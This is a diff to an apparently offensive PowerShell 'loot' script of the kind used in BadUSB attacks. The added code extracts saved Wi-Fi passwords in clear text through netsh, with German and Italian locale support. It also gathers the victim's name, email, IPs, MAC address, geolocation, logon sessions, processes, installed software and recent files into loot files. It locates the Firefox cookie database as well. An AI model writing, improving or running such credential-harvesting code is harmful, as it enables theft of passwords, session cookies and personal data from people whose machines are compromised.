@@ -247,7 +247,30 @@ $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.
 # Get Network Interfaces
 $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+############################################################################################################################################################
+
+
+# Determine system language
+$language = (Get-Culture).TwoLetterISOLanguageName
+
+switch ($language) {
+    'de' { # German
+        $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
+        $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
+    }
+    'it' { # Italian
+        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
+        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
+    }
+    default { # Default to English if language is not supported
+        $userProfileString = '(?<=All User Profile\s+:\s).+'
+        $keyContentString = '(?<=Key Content\s+:\s).+'
+    }
+}
+
+
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String $keyContentString | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 ############################################################################################################################################################
 
@@ -286,20 +309,36 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 
 # OUTPUTS RESULTS TO LOOT FILE
 
-$output = @"
+$userInfo = @"
 
 Full Name: $fullName
 
 Email: $email
 
-GeoLocation:
-Latitude:  $Lat 
-Longitude: $Lon
+Computer Name:
+$computerName
 
 ------------------------------------------------------------------------------------------------------------------------------
 
 Local Users:
 $luser
+
+------------------------------------------------------------------------------------------------------------------------------
+
+
+Public IP: 
+$computerPubIP
+
+Local IPs:
+$localIP
+
+MAC:
+$MAC
+
+
+GeoLocation:
+Latitude:  $Lat 
+Longitude: $Lon
 
 ------------------------------------------------------------------------------------------------------------------------------
 
@@ -312,21 +351,16 @@ $lsass
 RDP State:
 $RDP
 
-------------------------------------------------------------------------------------------------------------------------------
-
-Public IP: 
-$computerPubIP
-
-Local IPs:
-$localIP
-
-MAC:
-$MAC
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-Computer Name:
-$computerName
+Logon Sessions:
+$klist
+
+
+"@
+
+$hardwareInfo = @"
 
 Model:
 $computerModel
@@ -357,28 +391,10 @@ $videocard
 
 ------------------------------------------------------------------------------------------------------------------------------
 
-Contents of Start Up Folder:
-$StartUp
-
-------------------------------------------------------------------------------------------------------------------------------
-
-Scheduled Tasks:
-$ScheduledTasks
-
-------------------------------------------------------------------------------------------------------------------------------
-
-Logon Sessions:
-$klist
-
-------------------------------------------------------------------------------------------------------------------------------
-
-Recent Files:
-$RecentFiles
-
-------------------------------------------------------------------------------------------------------------------------------
-
 Hard-Drives:
 $Hdds
+
+------------------------------------------------------------------------------------------------------------------------------
 
 COM Devices:
 $COMDevices
@@ -388,7 +404,33 @@ $COMDevices
 Network Adapters:
 $NetworkAdapters
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$startupFolder = @"
+
+Contents of Start Up Folder:
+$StartUp
+
+"@
+
+$scheduledTaskInfo = @"
+
+Scheduled Tasks:
+$ScheduledTasks
+
+"@
+
+
+
+$recenFilesInfo = @"
+
+
+Recent Files:
+$RecentFiles
+
+"@
+
+$wifiData = @"
 
 Nearby Wifi:
 $NearbyWifi
@@ -396,36 +438,56 @@ $NearbyWifi
 Wifi Profiles: 
 $wifiProfiles
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$processes = @"
 
 Process:
 $process
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$listenerInfo = @"
 
 Listeners:
 $listener
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$serviceInfo = @"
 
 Services:
 $service
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$installedSoft = @"
 
 Installed Software: 
 $software
 
-------------------------------------------------------------------------------------------------------------------------------
+"@
+
+$allDrivers = @"
 
 Drivers: 
 $drivers
 
-------------------------------------------------------------------------------------------------------------------------------
-
 "@
 
-$output > $env:TEMP\$FolderName/computerData.txt
+
+
+#TODO: change / to \
+$userInfo > $env:TEMP\$FolderName/UserInfo.txt
+$hardwareInfo > $env:TEMP\$FolderName/HardwareInfo.txt
+$startupFolder > $env:TEMP\$FolderName/StartupFolderContent.txt
+$scheduledTaskInfo > $env:TEMP\$FolderName/ScheduledTaskInfo.txt
+$wifiData > $env:TEMP\$FolderName/WifiData.txt
+$processes > $env:TEMP\$FolderName/Processes.txt
+$listenerInfo > $env:TEMP\$FolderName/Listeners.txt
+$serviceInfo > $env:TEMP\$FolderName/Services.txt
+$installedSoft > $env:TEMP\$FolderName/InstalledSoftware.txt
+$alldrivers > $env:TEMP\$FolderName/Drivers.txt
 
 ############################################################################################################################################################
 
@@ -564,9 +626,15 @@ Get-DnsRequests >> $env:TMP\$FolderName\DnsRequests.txt
 ############################################################################################################################################################
 
 
+$firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
+$firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}
+
+$filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'
+
+echo $filePath >> $env:TMP\$FolderName\FirefoxCookies.txt
 
 
-
+############################################################################################################################################################
 
 
 
